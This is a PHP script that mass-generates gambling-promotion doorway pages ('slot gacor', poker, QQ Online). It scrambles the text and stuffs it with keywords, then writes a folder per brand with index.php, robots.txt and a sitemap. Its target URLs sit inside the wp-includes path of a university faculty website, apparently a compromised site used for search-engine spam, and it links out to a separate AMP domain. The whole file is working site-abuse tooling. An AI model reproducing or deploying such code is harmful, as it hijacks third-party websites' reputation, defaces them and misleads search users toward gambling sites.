<?php
ini_set('max_execution_time', 0); // 0 berarti tidak ada batas waktu

// Constants and Settings
define("BRAND_FILE", "brand.txt");
define("TITLE_FILE", "title.txt");
define("DESCRIPTION_FILE", "description.txt");
define("DOMAIN", "https://doktor.fh.unila.ac.id/wp-includes/docs/");
define("DEFAULT_AMP_LINK", "https://unila.officialvladd.id/");

// Customizable Elements as URLs
$mainImage = "https://i.pinimg.com/236x/d6/1d/e2/d61de27e95dfaeaaf415dbc2daa116a1.jpg";
$logo = "https://unila.officialvladd.id/logo.png";
$favicon = "https://fh.unila.ac.id/wp-content/uploads/2022/06/cropped-Logo-FH-192x192.png";
$imageContent2 = "https://i.imgur.com/KPRioKx.gif";
$links = "https://bit.ly/id-daftar1";

// Helper Functions
function scrambleText($text, $keywords)
{
    $sentences = explode(".", $text);
    shuffle($sentences);

    foreach ($sentences as &$sentence) {
        foreach ($keywords as $keyword) {
            if (strpos($sentence, $keyword) !== false) {
                break;
            } else {
                $sentence .= " " . $keyword;
            }
        }
    }
    return implode(". ", $sentences);
}

function replaceBrandName($text, $brandName)
{
    return str_replace("{brand}", $brandName, $text);
}

function readAndScrambleFile($filename, $brandName = '', $keywords = [])
{
    $lines = file($filename, FILE_IGNORE_NEW_LINES);
    return array_map(function ($line) use ($brandName, $keywords) {
        $line = scrambleText($line, $keywords);
        return $brandName ? replaceBrandName($line, $brandName) : $line;
    }, $lines);
}

function formatTitle($title)
{
    return ucwords(strtolower($title));
}

function formatDescription($description, $brandName)
{
    // Prepend brand name to the description
    $description = $brandName . "\n\n" . $description;

    $description = trim($description);
    $description = ucfirst(strtolower($description));

    if (!preg_match('/[.!?]$/', $description)) {
        $description .= '.';
    }

    $description = preg_replace_callback('/[.!?]\s*([a-z])/', function ($matches) {
        return strtoupper($matches[0]);
    }, $description);

    // Split into words and ensure it has 90 words split into 3 paragraphs
    $words = explode(' ', $description);
    $totalWords = 60;
    if (count($words) > $totalWords) {
        $words = array_slice($words, 0, $totalWords);
    }
    $description = implode(' ', $words);

    // Split into 3 paragraphs
    $parts = array_chunk($words, ceil(count($words) / 3));
    $description = '';
    foreach ($parts as $part) {
        $description .= implode(' ', $part) . "\n\n";
    }

    return $description;
}

function getBrandNameFromFolder($folderPath)
{
    $brandName = basename($folderPath);
    return str_replace('-', ' ', $brandName);
}

function createBrandFolders()
{
    global $logo, $favicon, $mainImage, $imageContent2, $links;

    $brands = file(BRAND_FILE, FILE_IGNORE_NEW_LINES);
	$keywords2 = ['Agen Resmi Situs Poker Pkv Games Maxxwin Hari Ini'];
    $keywords = ['QQ Online'];

    foreach ($brands as $brand) {
        $folderName = str_replace(" ", "-", $brand);

        echo "Processing brand: $brand\n<br>";
        echo "Folder name: $folderName\n<br><br>";
        
        if (file_exists($folderName)) {
            echo "Folder $folderName already exists. Deleting...\n<br>";
            deleteFolder($folderName);
        }

        if (mkdir($folderName)) {
            echo "Folder $folderName created successfully.\n<br>";
        } else {
            echo "Failed to create folder $folderName.\n<br>";
            continue;
        }
        echo "Folder $folderName created successfully.\n<br><br>";

        $titles = readAndScrambleFile(TITLE_FILE, $brand, $keywords2);
        $descriptions = readAndScrambleFile(DESCRIPTION_FILE, $brand, $keywords);

        $title = formatTitle($titles[array_rand($titles)]);
        $description = formatDescription($descriptions[array_rand($descriptions)], $brand . ' adalah platform permainan slot gacor hari ini tahun 2024. Link Situs ' . $brand . ' menawarkan berbagai permainan slot gacor gampang menang terbaru, terlengkap dan terpercaya. ');

        $url = DOMAIN . $folderName;
        $canonicalUrl = $url . '/';
        $customAmpLink = DEFAULT_AMP_LINK . $folderName . "/";

        
        ob_start();
        include 'theme.php';
        $content = ob_get_clean();

        file_put_contents($folderName . '/index.php', $content);
        file_put_contents($folderName . '/robots.txt', "User-agent: *\nAllow: /\n\nSitemap: " . DOMAIN . "sitemap.xml\n");
        echo "Files created in $folderName.\n\n";

    }
}

function deleteFolder($folderName)
{
    if (is_dir($folderName)) {
        $files = array_diff(scandir($folderName), array('.', '..'));
        foreach ($files as $file) {
            (is_dir("$folderName/$file")) ? deleteFolder("$folderName/$file") : unlink("$folderName/$file");
        }
        return rmdir($folderName);
    }
    return false;
}

function generateSitemap()
{
    $brands = file(BRAND_FILE, FILE_IGNORE_NEW_LINES);
    $sitemapContent = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
    $sitemapContent .= "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n";

    foreach ($brands as $brand) {
        $folderName = str_replace(" ", "-", $brand);
        $url = DOMAIN . $folderName;

        $sitemapContent .= "<url>\n";
        $sitemapContent .= "  <loc>" . htmlspecialchars($url . '/') . "</loc>\n";
        $sitemapContent .= "  <lastmod>" . date('c') . "</lastmod>\n";
        $sitemapContent .= "</url>\n";
    }

    $sitemapContent .= "</urlset>";
    file_put_contents('sitemap.xml', $sitemapContent);
}

createBrandFolders();
generateSitemap();

?>
